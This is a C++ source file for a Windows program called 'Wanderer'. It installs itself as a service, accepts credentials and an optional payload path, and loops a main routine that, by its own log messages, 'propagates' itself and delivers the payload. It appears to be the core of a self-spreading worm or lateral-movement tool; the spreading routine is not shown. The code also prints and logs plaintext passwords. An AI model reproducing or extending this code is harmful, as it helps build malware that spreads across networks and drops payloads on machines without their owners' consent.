#ifndef WIN32_LEAN_AND_MEAN
#define WIN32_LEAN_AND_MEAN
#endif

#include "Wanderer.h"
using namespace std;

//Globals
SERVICE_STATUS_HANDLE ghService = NULL;
SERVICE_STATUS gServiceStatus = {0};
HANDLE gServiceStopEvent = INVALID_HANDLE_VALUE;
char* startingPath;
options cmdOpts={0};
extern Log logFile;

//Functions
DWORD StartLocalService();
VOID WINAPI ServiceMain (DWORD argc, LPTSTR *argv);
VOID WINAPI ServiceControlHandler (DWORD);
DWORD WINAPI ServiceWorkerThread (LPVOID lpParam);
void ReportSvcStatus( DWORD dwCurrentState, DWORD dwWin32ExitCode, DWORD dwWaitHint);


DWORD StartLocalService()
{
	std::string error;

	SERVICE_TABLE_ENTRY ServiceTable[] =
	{
		{ SERVICE_NAME,(LPSERVICE_MAIN_FUNCTION) ServiceMain }, 
		{ NULL, NULL }
	};

	if (!StartServiceCtrlDispatcher( ServiceTable )) 
  { 
				logFile.LogError("Error in StartLocalService when trying to run Dispacter: ",GetLastError());
				return -1;
  } 


	return 0;

}

VOID WINAPI ServiceMain(DWORD dwArgc, LPTSTR* lpszArgv)
{

	ghService = RegisterServiceCtrlHandler(SERVICE_NAME, ServiceControlHandler);
	if(0 == ghService)
	{
		//Error registering Service handler
		logFile.LogError("Error in ServiceMain when trying to run Register: ",GetLastError());
		return;
	}

	gServiceStatus.dwServiceType = SERVICE_WIN32_OWN_PROCESS;
	gServiceStatus.dwServiceSpecificExitCode = 0;

	ReportSvcStatus( SERVICE_START_PENDING, NO_ERROR, 3000 );

	// Create a service stop event to wait on later 
  gServiceStopEvent = CreateEvent (NULL, TRUE, FALSE, NULL);
  if (gServiceStopEvent == NULL) 
  {   
			ReportSvcStatus( SERVICE_STOPPED, NO_ERROR, 0 );
      return; //Error creating stop event
  }    
  ReportSvcStatus( SERVICE_RUNNING, NO_ERROR, 0 );
 
  // Start a thread that will perform the main task of the service
  HANDLE hThread = CreateThread (NULL, 0, ServiceWorkerThread, NULL, 0, NULL);
   while(1){
		// Check wheather to stop service
		WaitForSingleObject (gServiceStopEvent, INFINITE);
		ReportSvcStatus( SERVICE_STOPPED, NO_ERROR, 0 );
		CloseHandle(gServiceStopEvent);
		return;

	 }
   
}

void WINAPI ServiceControlHandler(DWORD dwControl)
{
	switch(dwControl)
	{
	case SERVICE_CONTROL_SHUTDOWN:
	case SERVICE_CONTROL_STOP:
		SetEvent(gServiceStopEvent);
		ReportSvcStatus(gServiceStatus.dwCurrentState, NO_ERROR, 0);
		break;
   case SERVICE_CONTROL_INTERROGATE: 
    break; 
	default:
		break;
	}
}

DWORD WINAPI ServiceWorkerThread (LPVOID lpParam)
{
    //  Periodically check if the service has been requested to stop
    while (WaitForSingleObject(gServiceStopEvent, 0) != WAIT_OBJECT_0)
    {        
			wandererMain();
    }
 
    return ERROR_SUCCESS;
} 

void ReportSvcStatus( DWORD dwCurrentState, DWORD dwWin32ExitCode, DWORD dwWaitHint)
{
    static DWORD dwCheckPoint = 1;

    // Fill in the SERVICE_STATUS structure.

    gServiceStatus.dwCurrentState = dwCurrentState;
    gServiceStatus.dwWin32ExitCode = dwWin32ExitCode;
    gServiceStatus.dwWaitHint = dwWaitHint;

    if (dwCurrentState == SERVICE_START_PENDING)
        gServiceStatus.dwControlsAccepted = 0;
    else gServiceStatus.dwControlsAccepted = SERVICE_ACCEPT_STOP;

    if ( (dwCurrentState == SERVICE_RUNNING) ||
           (dwCurrentState == SERVICE_STOPPED) )
        gServiceStatus.dwCheckPoint = 0;
    else gServiceStatus.dwCheckPoint = dwCheckPoint++;

    // Report the status of the service to the SCM.
    if(!SetServiceStatus( ghService, &gServiceStatus ))
			logFile.LogError("Failed to set service status. ",GetLastError());
}

void parseArgs(int num, char* args[]){
	int i;

	cmdOpts.origPath = args[0];
	if(num >1){
		for(i =1;i<num;i++){
			if(compare(args[i],SERVICE_FLAG)){

				cmdOpts.isService = true;
			}
			else if(compare(args[i],USERNAME_FLAG)){
				try{
					cmdOpts.username = args[i+1];

				}
				catch(int e){e=0; continue;}
				
			}
			else if(compare(args[i],PASSWORD_FLAG)){
				try{
					cmdOpts.password = args[i+1];

				}
				catch(int e){e=0;continue;}
			}
			else if(compare(args[i],PAYLOAD_FLAG)){
				try{
					cmdOpts.payloadPath = args[i+1];

				}
				catch(int e){e=0;continue;}
			}
		}
	}
}

int main(int argc, char *argv[])
{
	if(argc <= 1) { //Not enough args, print help and exit
		printf("USAGE: Wanderer.exe [-service] -u username -p password [-e payload]");
		return 0;
	}

	//parse args we have
	parseArgs(argc,argv);
	//Check we have a username and password
	if(cmdOpts.username == NULL || cmdOpts.password == NULL)
	{
		printf("No username or password supplied.");
		logFile.EpicFail("No username or password supplied",-1);
	}
	else{
		printf("Using username %s and password %s\n",cmdOpts.username,cmdOpts.password);
		logFile.LogDebug("Username: ",cmdOpts.username);
		logFile.LogDebug("Password: ",cmdOpts.password);
		if(cmdOpts.payloadPath == NULL){
			logFile.LogDebug("No payload given.  Will only propergate.");
			printf("No payload given.  Will only propergate. \n");
		}
		else{
			printf("Using payload: %s\n",cmdOpts.payloadPath);
			logFile.LogDebug("Using payload: ",cmdOpts.payloadPath);
		}
	}
	//Check if we are a service
	if(cmdOpts.isService)
		StartLocalService(); //Start as service
	else
		wandererMain(); //Start as application


   return 0;
}

//*********************************************


